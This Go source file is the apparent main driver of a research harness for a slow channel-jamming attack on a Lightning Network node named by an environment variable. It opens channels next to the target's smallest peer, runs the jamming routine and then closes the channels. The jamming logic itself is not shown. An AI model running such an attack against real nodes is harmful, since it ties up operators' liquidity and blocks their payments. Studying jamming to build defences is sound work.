package main

import (
	"context"
	"errors"
	"fmt"
	"os"

	"github.com/lightningnetwork/lnd/routing/route"
	"github.com/lightningnetwork/lnd/signal"
)

var errShutdown = errors.New("shutdown signal")

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	lnds, err := getLndNodes(ctx)
	if err != nil {
		fmt.Printf("Could not set up connection: %v\n", err)
		os.Exit(1)
	}

	target, err := route.NewVertexFromStr(os.Getenv("TARGET"))
	if err != nil {
		fmt.Printf("Could not get target node: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Starting attack against: %v\n", target)
	signal, err := signal.Intercept()
	if err != nil {
		fmt.Printf("Could not intercept signal: %v\n", err)
		os.Exit(1)
	}

	// Write your attack here!
	//
	// We've provided two utilities for you:
	// - GraphHarness: handles channel opens, P2P connection and graph lookups
	// - JammingHarness: handles sending and holding of payments
	graph := &GraphHarness{
		LndNodes: lnds,
	}
	jammer := &JammingHarness{
		LndNodes: lnds,
	}
	rep := &ReputationHarness{
		LndNodes: lnds,
		graph:    graph,
		jammer:   jammer,
	}

	cleanup := func() error {
		fmt.Println("Cleaning up opened channels for all nodes")
		if err := graph.CloseAllChannels(ctx, 0); err != nil {
			return err
		}

		if err := graph.CloseAllChannels(ctx, 1); err != nil {
			return err
		}

		if err := graph.CloseAllChannels(ctx, 2); err != nil {
			return err
		}

		return nil
	}

	peer, err := graph.SmallestPeer(ctx, target)
	if err != nil {
		fmt.Printf("Could not find smallest peer: %v\n", err)
		os.Exit(1)
	}

	if err := rep.OpenChannels(ctx, target, peer); err != nil {
		fmt.Printf("Could not open channels: %v\n", err)
		if err := cleanup(); err != nil {
			fmt.Printf("Could not clean up channels: %v", err)
		}

		os.Exit(1)
	}

	if err := RunSlowJammingAttack(ctx, signal, rep); err != nil {
		fmt.Printf("Could not run attack: %v\n", err)
		if err := cleanup(); err != nil {
			fmt.Printf("Could not clean up channels: %v", err)
		}
		os.Exit(1)
	}

	if err := cleanup(); err != nil {
		fmt.Printf("Could not clean up channels: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Waiting for threads to shutdown")
	cancel()
	jammer.wg.Wait()
	graph.wg.Wait()
	rep.wg.Wait()
}
